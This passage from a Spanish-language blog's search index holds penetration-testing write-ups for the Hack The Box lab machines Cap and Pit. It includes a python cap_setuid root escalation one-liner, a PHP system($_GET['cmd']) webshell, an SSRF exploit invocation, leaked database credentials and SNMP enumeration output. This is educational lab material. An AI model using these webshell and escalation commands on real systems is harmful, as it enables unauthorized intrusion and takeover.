{ip}\u0026#34;)\u0026#39;\u0026#34;\u0026#34;\u0026#34; os.system(command) #os.setuid(1000) return redirect(\u0026#34;/data/\u0026#34; + str(pcapid)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 #!/usr/bin/python3 import os from flask import * from flask_limiter import Limiter from flask_limiter.util import get_remote_address import tempfile import dpkt from werkzeug.utils import append_slash_redirect app = Flask(__name__) app.config[\u0026#39;TEMPLATES_AUTO_RELOAD\u0026#39;] = True app.secret_key = b\u0026#39;\\x81\\x02\u0026amp;\\x18\\\\a0ej\\x06\\xec\\x917y*\\x04Y\\x83e\\xebC\\xee\\xab\\xcf\\xac;\\x8dx\\x8bf\\xc4\\x15\u0026#39; limiter = Limiter(app, key_func=get_remote_address, default_limits=[\u0026#34;99999999999999999 per day\u0026#34;, \u0026#34;99999999999999999999 per hour\u0026#34;]) pcapid = 0 lock = False @app.before_first_request def get_file_id(): global pcapid path = os.path.join(app.root_path, \u0026#34;upload\u0026#34;) onlyfiles = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))] ints = [] for x in onlyfiles: try: ints.append(int(x.replace(\u0026#34;.pcap\u0026#34;, \u0026#34;\u0026#34;))) except: pass try: pcapid = max(ints)+1 except: pcapid = 0 def get_appid(): global pcapid return pcapid def increment_appid(): global pcapid pcapid += 1 def get_lock(): global lock while lock: pass lock = True def release_lock(): global lock lock = False def process_pcap(pcap_path): reader = dpkt.pcap.Reader(open(pcap_path, \u0026#34;rb\u0026#34;)) counter=0 ipcounter=0 tcpcounter=0 udpcounter=0 for ts, pkt in reader: counter+=1 eth=dpkt.ethernet.Ethernet(pkt) try: ip=dpkt.ip.IP(eth.data) except: continue ipcounter+=1 if ip.p==0: tcpcounter+=1 if ip.p==dpkt.ip.IP_PROTO_UDP: udpcounter+=1 data = {} data[\u0026#39;Number of Packets\u0026#39;] = counter data[\u0026#39;Number of IP Packets\u0026#39;] = ipcounter data[\u0026#39;Number of TCP Packets\u0026#39;] = tcpcounter data[\u0026#39;Number of UDP Packets\u0026#39;] = udpcounter return data @app.route(\u0026#34;/\u0026#34;) def index(): return render_template(\u0026#34;index.html\u0026#34;) PCAP_MAGIC_BYTES = [b\u0026#34;\\xa1\\xb2\\xc3\\xd4\u0026#34;, b\u0026#34;\\xd4\\xc3\\xb2\\xa1\u0026#34;, b\u0026#34;\\x0a\\x0d\\x0d\\x0a\u0026#34;] @app.route(\u0026#34;/capture\u0026#34;) @limiter.limit(\u0026#34;10 per minute\u0026#34;) def capture(): get_lock() pcapid = get_appid() increment_appid() release_lock() path = os.path.join(app.root_path, \u0026#34;upload\u0026#34;, str(pcapid) + \u0026#34;.pcap\u0026#34;) ip = request.remote_addr # permissions issues with gunicorn and threads. hacky solution for now. #os.setuid(0) #command = f\u0026#34;timeout 5 tcpdump -w {path} -i any host {ip}\u0026#34; command = f\u0026#34;\u0026#34;\u0026#34;python3 -c \u0026#39;import os; os.setuid(0); os.system(\u0026#34;timeout 5 tcpdump -w {path} -i any host {ip}\u0026#34;)\u0026#39;\u0026#34;\u0026#34;\u0026#34; os.system(command) #os.setuid(1000) return redirect(\u0026#34;/data/\u0026#34; + str(pcapid)) @app.route(\u0026#34;/ip\u0026#34;) def ifconfig(): d = os.popen(\u0026#34;ifconfig\u0026#34;).read().strip() print(d) return render_template(\u0026#34;index.html\u0026#34;, rawtext=d) @app.route(\u0026#34;/netstat\u0026#34;) def netstat(): d = os.popen(\u0026#34;netstat -aneop\u0026#34;).read().strip() print(d) return render_template(\u0026#34;index.html\u0026#34;, rawtext=d) @app.route(\u0026#34;/data\u0026#34;) def data(): if \u0026#34;data\u0026#34; not in session: return redirect(\u0026#34;/\u0026#34;) data = session.pop(\u0026#34;data\u0026#34;) path = session.pop(\u0026#34;path\u0026#34;) return render_template(\u0026#34;data.html\u0026#34;, data=data, path=path) @app.route(\u0026#34;/data/\u0026lt;id\u0026gt;\u0026#34;) def data_id(id): try: id = int(id) except: return redirect(\u0026#34;/\u0026#34;) try: data = process_pcap(os.path.join(app.root_path, \u0026#34;upload\u0026#34;, str(id) + \u0026#34;.pcap\u0026#34;)) path = str(id) + \u0026#34;.pcap\u0026#34; return render_template(\u0026#34;index.html\u0026#34;, data=data, path=path) except Exception as e: print(e) return redirect(\u0026#34;/\u0026#34;) @app.route(\u0026#34;/download/\u0026lt;id\u0026gt;\u0026#34;) def download(id): try: id = int(id) except: return redirect(\u0026#34;/\u0026#34;) uploads = os.path.join(app.root_path, \u0026#34;upload\u0026#34;) return send_from_directory(uploads, str(id) + \u0026#34;.pcap\u0026#34;, as_attachment=True) if __name__ == \u0026#34;__main__\u0026#34;: app.run(\u0026#34;0.0.0.0\u0026#34;, 80, debug=True) Realizamos una enumeracion de las capabilities, vemos que python se lista con la capability cap_setuid lo que nos permitiria obtener acceso privilegiado el cual utilizamos para ejecutar bash (GTFOBins - Python) , logrando obtener acceso como root y leer la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 nathan@cap:~$ getcap -r / 2\u0026gt;/dev/null /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip /usr/bin/ping = cap_net_raw+ep /usr/bin/traceroute6.iputils = cap_net_raw+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep nathan@cap:~$ python3.8 -c \u0026#39;import os; os.setuid(0); os.system(\u0026#34;/bin/bash\u0026#34;)\u0026#39; root@cap:~# whoami root root@cap:~# ls user.txt root@cap:~# cd root@cap:~# ls user.txt root@cap:~# cd /root root@cap:/root# ls root.txt snap root@cap:/root# cat root.txt f5fbfb8a01d451fdb4a27fdb09d1f7c4 root@cap:/root# who nathan pts/0 2021-06-05 19:27 (10.10.14.25) root@cap:/root# ","description":"En Cap encontramos distintas funcionalidades informativas del sistema, una de ellas permite la descarga y analisis de archivos .pcap, luego del analisis de un archivo encontramos credenciales que nos dieron acceso por FTP y SSH. Tras enumerar las capabilities del sistema logramos escalar privilegios por medio de Python.","id":48,"section":"posts","tags":["python","wireshark","ftp","capabilities"],"title":"Hack The Box - Cap","uri":"https://sckull.github.io/posts/cap/"},{"content":"\rPit corre snmp donde encontramos informacion que nos permitio explotar una vulnerabilidad en SeedDMS para lograr obtener acceso por Cockpit con contraseñas almacenadas. Finalmente escalamos privilegios utilizando un script que encontramos en snmp.\nNombre Pit OS Linux Puntos 30 Dificultad Media IP 10.10.10.241 Maker polarbearer GibParadox Matrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.2, 4.7, 4.3, 5.7, 5.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon Nmap Escaneo de puertos con nmap nos muestra el puerto http (80), ssh (22) y el puerto http/s (9090) abiertos, además se muestra un dominio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # Nmap 7.91 scan initiated Tue May 18 18:03:29 2021 as: nmap -Pn -sC -sV -p22,80,9090 -oN scan_ports 10.10.10.241 Nmap scan report for 10.10.10.241 (10.10.10.241) Host is up (0.071s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA) | 256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA) |_ 256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519) 80/tcp open http nginx 1.14.1 |_http-server-header: nginx/1.14.1 |_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux 9090/tcp open ssl/zeus-admin? | fingerprint-strings: | GetRequest, HTTPOptions: | HTTP/1.1 400 Bad request | Content-Type: text/html; charset=utf8 | Transfer-Encoding: chunked | X-DNS-Prefetch-Control: off | Referrer-Policy: no-referrer | X-Content-Type-Options: nosniff | Cross-Origin-Resource-Policy: same-origin | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt; | request | \u0026lt;/title\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; | \u0026lt;style\u0026gt; | body { | margin: 0; | font-family: \u0026#34;RedHatDisplay\u0026#34;, \u0026#34;Open Sans\u0026#34;, Helvetica, Arial, sans-serif; | font-size: 12px; | line-height: 1.66666667; | color: #333333; | background-color: #f5f5f5; | border: 0; | vertical-align: middle; | font-weight: 300; |_ margin: 0 0 10p | ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US | Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1 | Not valid before: 2020-04-16T23:29:12 |_Not valid after: 2030-06-04T16:09:12 |_ssl-date: TLS randomness does not represent time 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9090-TCP:V=7.91%T=SSL%I=7%D=5/18%Time=60A439EF%P=x86_64-pc-linux-gn SF:u%r([... snip ...]\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 18 18:06:42 2021 -- 1 IP address (1 host up) scanned in 193.85 seconds SSLScan Verificamos con SSLSCAN los dominios en el certificado.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/pit ❯ sslscan 10.10.10.241:9090|tail SSL Certificate: Signature Algorithm: sha256WithRSAEncryption RSA Key Strength: 2048 Subject: dms-pit.htb Altnames: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1 Issuer: dms-pit.htb Not valid before: Apr 16 23:29:12 2020 GMT Not valid after: Jun 4 16:09:12 2030 GMT HTTP Encontramos el index de nginx en lo que parece ser la version de Red Hat.\nEl dominio dms-pit.htb no muestra nada y al ejecutar gobuster no muestra direcciones.\nCOCKPIT En el puerto 9090/https encontramos un login de lo que parecia ser CentOS, al investigar, encontramos que cockpit es una interfaz web para el manejo de servidores.\nExploit Aparentemente Cockpit tiene una vulnerabilidad SSRF (Unauthenticated) con la cual se pueden detectar puertos abiertos, tras ejecutar el exploit encontramos el puerto 22 con un tipo de respuesta de autorizacion, intentamos autorizar nuestra direccion IP pero encontramos que el host por default para ingresar es 127.0.0.1.\n1 2 # python3 SSRF_cockpit_234.py --target pit.htb:9090 --scan localhost --ports [...] # portRange = list(range(23,1024)) Snmp Despues de intentar varias cosas en cockpit realizamos nuevamente un escaneo de puertos utilizando masscan donde se incluyeron los puertos UDP.\nMasscan Tras finalizar se mostraron los mismos puertos que con nmap, con la excepcion de el puerto UDP 161 (snmp).\n1 2 3 4 5 6 7 8 π ~/htb/pit/tmp ❯ sudo masscan -p1-65535,U:1-65535 10.10.10.241 --rate=1000 -e tun0 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-05-20 03:47:49 GMT Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.241 Discovered open port 9090/tcp on 10.10.10.241 Discovered open port 80/tcp on 10.10.10.241 Discovered open port 161/udp on 10.10.10.24 Setup Antes de realizar cualquier solicitud con herramientas para snmp se realizó la instalacion del packete de MIBs, ya que en las solicitudes solamente se muestran los OIDs. Asi mismo se comento en el archivo snmp.conf la linea mibs :.\n1 2 3 4 5 6 7 # sudo apt-get install snmp #if necessary # sudo apt-get install snmp-mibs-downloader π ~/htb/pit ❯ ll /etc/snmp/snmp.conf -rw-r--r-- 1 root root 511 May 18 20:22 /etc/snmp/snmp.conf π ~/htb/pit ❯ cat /etc/snmp/snmp.conf|grep -v \u0026#34;#\u0026#34; mibs : snmp - client Snmp Check Utilizamos snmp-check, no mostró mucho, más que algunos procesos e informacion del sistema, utilizando: \u0026quot;community: public, version: 2c\u0026quot;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 π ~/htb/pit/tmp ❯ snmp-check -v 2c -c public 10.10.10.241 snmp-check v1.9 - SNMP enumerator Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org) [+] Try to connect to 10.10.10.241:161 using SNMPv2c and community \u0026#39;public\u0026#39; [*] System information: Host IP address : 10.10.10.241 Hostname : pit.htb Description : Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64 Contact : Root \u0026lt;root@localhost\u0026gt; (configure /etc/snmp/snmp.local.conf) Location : Unknown (edit /etc/snmp/snmpd.conf) Uptime snmp : 00:24:07.24 Uptime system : 00:23:23.02 System date : - [*] Network information: Default TTL : noSuchObject TCP segments received : noSuchObject TCP segments sent : noSuchObject TCP segments retrans : noSuchObject Input datagrams : noSuchObject Delivered datagrams : noSuchObject Output datagrams : noSuchObject [*] Processes: Id Status Name Path Parameters 1 runnable systemd /usr/lib/systemd/systemd --switched-root --system --deserialize 17 2 runnable kthreadd [... snip ...] 992 runnable auditd /sbin/auditd 994 runnable sedispatch /usr/sbin/sedispatch 1026 runnable polkitd /usr/lib/polkit-1/polkitd --no-debug 1028 runnable VGAuthService /usr/bin/VGAuthService -s 1029 runnable vmtoolsd /usr/bin/vmtoolsd 1030 runnable dbus-daemon /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 1032 runnable irqbalance /usr/sbin/irqbalance --foreground 1034 runnable sssd /usr/sbin/sssd -i --logger=files 1039 runnable chronyd /usr/sbin/chronyd 1050 runnable rngd /sbin/rngd -f --fill-watermark=0 1069 runnable sssd_be /usr/libexec/sssd/sssd_be --domain implicit_files --uid 0 --gid 0 --logger=files 1077 runnable sssd_nss /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files 1079 runnable firewalld /usr/libexec/platform-python -s /usr/sbin/firewalld --nofork --nopid 1094 runnable systemd-logind /usr/lib/systemd/systemd-logind 1118 runnable NetworkManager /usr/sbin/NetworkManager --no-daemon 1129 runnable tuned /usr/libexec/platform-python -Es /usr/sbin/tuned -l -P 1132 runnable sshd /usr/sbin/sshd -D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128 1169 runnable crond /usr/sbin/crond -n 1170 unknown kworker/1:5-cgroup_pidlist_destroy 1181 runnable agetty /sbin/agetty -o -p -- \\u --noclear tty1 linux 1228 runnable mysqld /usr/libexec/mysqld --basedir=/usr 1235 runnable nginx nginx: master process /usr/sbin/nginx 1236 runnable nginx nginx: worker process 1237 runnable nginx nginx: worker process 1508 running snmpd /usr/sbin/snmpd -LS0-6d -f 1510 runnable rsyslogd /usr/sbin/rsyslogd -n 1693 unknown kworker/0:0-events 1707 running kworker/1:1-events 1800 unknown kworker/0:2-events 1807 unknown kworker/1:2-events 1845 runnable php-fpm php-fpm: master process (/etc/php-fpm.conf) 1846 runnable php-fpm php-fpm: pool www 1847 runnable php-fpm php-fpm: pool www 1848 runnable php-fpm php-fpm: pool www 1849 runnable php-fpm php-fpm: pool www 1850 runnable php-fpm php-fpm: pool www 1854 unknown kworker/u4:0-flush-253:0 1858 unknown kworker/1:4-cgroup_destroy [*] File system information: Index : noSuchObject Mount point : noSuchObject Access : noSuchObject Bootable : noSuchObject Snmap Walk snmp-walk de igual forma mostró la misma informacion que snmp-check, aunque con esta herramienta es posible obtener informacion de más de un grupo por lo que utilizamos .iso o .1.3 al final del comando para que se muestre más informacion. Además encontramos tambien un post sobre nsExtendObjects.\nInicialmente se analizó el output para analizar los diferentes \u0026ldquo;querys\u0026rdquo; para \u0026ldquo;ordenar\u0026rdquo; y \u0026ldquo;obtener más\u0026rdquo; informacion, vemos informacion del disco, informacion del sistema, algunos usuarios, roles y comando, aunque este ultimo no muestra ningun tipo de log de ejecucion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 #snmpwalk -v 2c -c public pit.htb .iso \u0026gt; out_snmp π ~/htb/pit ❯ snmpwalk -v 2c -c public pit.htb dskTable UCD-SNMP-MIB::dskIndex.1 = INTEGER: 1 UCD-SNMP-MIB::dskIndex.2 = INTEGER: 2 UCD-SNMP-MIB::dskPath.1 = STRING: / UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddms UCD-SNMP-MIB::dskDevice.1 = STRING: /dev/mapper/cl-root UCD-SNMP-MIB::dskDevice.2 = STRING: /dev/mapper/cl-seeddms [... snip ...] UCD-SNMP-MIB::dskErrorFlag.2 = INTEGER: error(1) π ~/htb/pit ❯ snmpwalk -v 2c -c public pit.htb nsExtendObjects NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1 NET-SNMP-EXTEND-MIB::nsExtendCommand.\u0026#34;monitoring\u0026#34; = STRING: /usr/bin/monitor NET-SNMP-EXTEND-MIB::nsExtendArgs.\u0026#34;monitoring\u0026#34; = STRING: NET-SNMP-EXTEND-MIB::nsExtendInput.\u0026#34;monitoring\u0026#34; = STRING: NET-SNMP-EXTEND-MIB::nsExtendCacheTime.\u0026#34;monitoring\u0026#34; = INTEGER: 5 NET-SNMP-EXTEND-MIB::nsExtendExecType.\u0026#34;monitoring\u0026#34; = INTEGER: exec(1) NET-SNMP-EXTEND-MIB::nsExtendRunType.\u0026#34;monitoring\u0026#34; = INTEGER: run-on-read(1) NET-SNMP-EXTEND-MIB::nsExtendStorage.\u0026#34;monitoring\u0026#34; = INTEGER: permanent(4) NET-SNMP-EXTEND-MIB::nsExtendStatus.\u0026#34;monitoring\u0026#34; = INTEGER: active(1) NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.\u0026#34;monitoring\u0026#34; = STRING: Memory usage NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\u0026#34;monitoring\u0026#34; = STRING: Memory usage total used free shared buff/cache available Mem: 3.8Gi 524Mi 3.0Gi 8.0Mi 303Mi 3.1Gi Swap: 1.9Gi 0B 1.9Gi Database status OK - Connection to database successful. System release info CentOS Linux release 8.3.2011 SELinux Settings user Labeling MLS/ MLS/ SELinux User Prefix MCS Level MCS Range SELinux Roles guest_u user s0 s0 guest_r root user s0 s0-s0:c0.c1023 staff_r sysadm_r system_r unconfined_r staff_u user s0 s0-s0:c0.c1023 staff_r sysadm_r unconfined_r sysadm_u user s0 s0-s0:c0.c1023 sysadm_r system_u user s0 s0-s0:c0.c1023 system_r unconfined_r unconfined_u user s0 s0-s0:c0.c1023 system_r unconfined_r user_u user s0 s0 user_r xguest_u user s0 s0 xguest_r login Login Name SELinux User MLS/MCS Range Service __default__ unconfined_u s0-s0:c0.c1023 * michelle user_u s0 * root unconfined_u s0-s0:c0.c1023 * System uptime 01:10:11 up 2:28, 0 users, load average: 0.54, 0.56, 0.48 NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.\u0026#34;monitoring\u0026#34; = INTEGER: 31 NET-SNMP-EXTEND-MIB::nsExtendResult.\u0026#34;monitoring\u0026#34; = INTEGER: 0 NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.1 = STRING: Memory usage NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.2 = STRING: total used free shared buff/cache available NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.3 = STRING: Mem: 3.8Gi 524Mi 3.0Gi 8.0Mi 303Mi 3.1Gi NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.4 = STRING: Swap: 1.9Gi 0B 1.9Gi NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.5 = STRING: Database status NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.6 = STRING: OK - Connection to database successful. NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.7 = STRING: System release info NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.8 = STRING: CentOS Linux release 8.3.2011 NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.9 = STRING: SELinux Settings NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.10 = STRING: user NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.11 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.12 = STRING: Labeling MLS/ MLS/ NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.13 = STRING: SELinux User Prefix MCS Level MCS Range SELinux Roles NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.14 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.15 = STRING: guest_u user s0 s0 guest_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.16 = STRING: root user s0 s0-s0:c0.c1023 staff_r sysadm_r system_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.17 = STRING: staff_u user s0 s0-s0:c0.c1023 staff_r sysadm_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.18 = STRING: sysadm_u user s0 s0-s0:c0.c1023 sysadm_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.19 = STRING: system_u user s0 s0-s0:c0.c1023 system_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.20 = STRING: unconfined_u user s0 s0-s0:c0.c1023 system_r unconfined_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.21 = STRING: user_u user s0 s0 user_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.22 = STRING: xguest_u user s0 s0 xguest_r NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.23 = STRING: login NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.24 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.25 = STRING: Login Name SELinux User MLS/MCS Range Service NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.26 = STRING: NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.27 = STRING: __default__ unconfined_u s0-s0:c0.c1023 * NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.28 = STRING: michelle user_u s0 * NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.29 = STRING: root unconfined_u s0-s0:c0.c1023 * NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.30 = STRING: System uptime NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.31 = STRING: 01:10:21 up 2:29, 0 users, load average: 0.53, 0.56, 0.48 NET-SNMP-EXTEND-MIB::nsExtendOutLine.\u0026#34;monitoring\u0026#34;.31 = No more variables left in this MIB View (It is past the end of the MIB tree) SeedDMS En informacion del disco encontramos el directorio de lo que parece ser SeedDMS, el nombre del directorio se utilizó para enumerar en los puertos http y los dominios.\n1 2 3 UCD-SNMP-MIB::dskPath.2 = STRING: /var/www/html/seeddms51x/seeddms UCD-SNMP-MIB::dskDevice.1 = STRING: /dev/mapper/cl-root UCD-SNMP-MIB::dskDevice.2 = STRING: /dev/mapper/cl-seeddms Encontramos el login de SeedDMS en dms-pit.htb/seeddms51x/seeddms/.\nNote Utilizamos un wordlist con todos los usuarios que encontramos (en SNMP) en el login, logramos ingresar utilizando michelle:michelle. Dentro, encontramos un documento con una nota en la que indica que SeedDMS fue actualizado a una nueva version (5.1.15) ya que la version 5.1.11 tendria multiples \u0026ldquo;problemas\u0026rdquo;, quizas relacionadas a vulnerabilidades (1,2,3), aunque SeedDMS no indica la version actual en ninguna parte de la plataforma, además encontramos el nombre de usuarios.\n1 2 3 4 5 6 Administrator (admin) admin@pit.htb Jack (jack) jack@dms-pit.htb Michelle (michelle) michelle@pit.htb WebShell Al no indicar la version en la plataforma y solamente mencionarse en el documento (CHANGELOG), realizamos la explotacion segun los pasos del exploit RCE, con el cual logramos ejecutar comandos.\n1 \u0026lt;?php echo(system($_GET[\u0026#39;cmd\u0026#39;])); ?\u0026gt; User - Michelle Se realizó una enumeracion utilizando la \u0026ldquo;webshell\u0026rdquo;, encontramos en los archivos de configuracion de SeedDMS (/var/www/html/seeddms51x/conf/settings.xml) las credenciales de la base de datos de mysql.\n1 \u0026lt;database dbDriver=\u0026#34;mysql\u0026#34; dbHostname=\u0026#34;localhost\u0026#34; dbDatabase=\u0026#34;seeddms\u0026#34; dbUser=\u0026#34;seeddms\u0026#34; dbPass=\u0026#34;ied^ieY6xoquu\u0026#34; doNotCheckVersion=\u0026#34;false\u0026#34;\u0026gt; Cockpit - Shell Utilizamos la contraseña y usuario michelle en cockpit, logramos obtener acceso, una shell y la flag user.txt.\nSnmp \u0026gt; Root En el servicio SNMP encontramos informacion acerca de un comando con nsExtendCommand, ademas informacion (1, 2) para ejecucion de comandos, sin embargo no funcionó en el comando monitor.\n1 2 3 π ~/htb/pit ❯ snmpwalk -v 2c -c public pit.htb nsExtendCommand NET-SNMP-EXTEND-MIB::nsExtendCommand.\u0026#34;monitoring\u0026#34; = STRING: /usr/bin/monitor π ~/htb/pit ❯ Verificamos el comando y vemos que realiza la ejecucion de scripts dentro de la carpeta /usr/local/monitoring/, el cual tiene permisos de acceso, verificamos la carpeta con getfacl y vemos que michelle tiene permisos de escritura y ejecucion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 [michelle@pit ~]$ file /usr/bin/monitor /usr/bin/monitor: Bourne-Again shell script, ASCII text executable [michelle@pit ~]$ cat /usr/bin/monitor #!/bin/bash for script in /usr/local/monitoring/check*sh do /bin/bash $script done [michelle@pit ~]$ ls -lah /usr/local/monitoring/ ls: cannot open directory \u0026#39;/usr/local/monitoring/\u0026#39;: Permission denied [michelle@pit ~]$ ls -lah /usr/local|grep monitoring drwxrwx---+ 2 root root 122 May 25 17:10 monitoring [michelle@pit ~]$ getfacl /usr/local/monitoring/ getfacl: Removing leading \u0026#39;/\u0026#39; from absolute path names # file: usr/local/monitoring/ # owner: root # group: root user::rwx user:michelle:-wx group::rwx mask::rwx other::--- [michelle@pit ~]$ Shell 